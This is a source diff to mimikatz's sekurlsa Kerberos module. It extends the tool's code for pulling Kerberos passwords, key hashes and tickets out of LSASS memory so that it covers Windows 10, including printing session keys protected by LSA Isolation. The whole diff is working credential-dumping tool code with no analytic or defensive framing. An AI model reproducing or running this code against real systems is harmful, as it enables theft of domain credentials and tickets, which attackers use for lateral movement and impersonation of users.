@@ -289,7 +289,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SE
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {*(PVOID *) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetSmartCard), pData->cLsass->hLsassMem};
 
-	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, 0);
+	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10);
 	if(aLsassMemory.address)
 	{
 		if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
@@ -350,7 +350,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURIT
 					{
 						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
 							for(i = 0; i < nbHash; i++)
-								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
+								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)));
 						LocalFree(aLocalHashMemory.address);
 					}
 				}
@@ -499,7 +499,7 @@ void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGO
 					pEnumData->callback(pData, aLocalMemory, aLsassMemory, pEnumData->optionalData);
 				LocalFree(aLocalMemory.address);
 			}
-		}
+		} else kprintf(L"KO");
 	} else kprintf(L"KO");
 }
 
@@ -511,6 +511,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 	DWORD nbTickets = 0;
 	PKIWI_KERBEROS_TICKET pKiwiTicket;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
+	BOOL isNormalSessionKey;
 	wchar_t * filename;
 
 	if(aTicket.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structTicketSize))
@@ -527,7 +528,8 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 					kprintf(L"\n\t [%08x]", nbTickets);
 					if(pKiwiTicket = kuhl_m_sekurlsa_kerberos_createTicket((LPBYTE) aTicket.address, pData->cLsass->hLsassMem))
 					{
-						kuhl_m_kerberos_ticket_display(pKiwiTicket, FALSE);
+						isNormalSessionKey = (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10) || (pKiwiTicket->Key.Length < FIELD_OFFSET(LSAISO_DATA_BLOB, data));
+						kuhl_m_kerberos_ticket_display(pKiwiTicket, isNormalSessionKey, FALSE);
 						if(isFile)
 							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
 							{
@@ -540,6 +542,12 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								}
 								LocalFree(filename);
 							}
+
+						if(!isNormalSessionKey)
+						{
+							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+							kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value);
+						}
 
 						kuhl_m_kerberos_ticket_freeTicket(pKiwiTicket);
 					}
